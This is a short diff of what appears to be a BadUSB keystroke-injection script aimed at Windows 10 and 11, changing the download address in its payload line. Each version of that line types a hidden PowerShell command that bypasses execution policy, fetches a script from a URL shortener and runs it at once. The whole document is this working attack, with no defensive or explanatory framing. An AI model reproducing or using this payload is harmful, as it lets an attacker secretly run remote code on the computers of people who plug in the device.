@@ -10,5 +10,5 @@ REM     Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell -w h -ep bypass $db='';irm https://n9.cl/ktijrn | iex
+STRING powershell -w h -ep bypass $db='';irm https://acortar.link/NQ0aAQ | iex
 ENTER
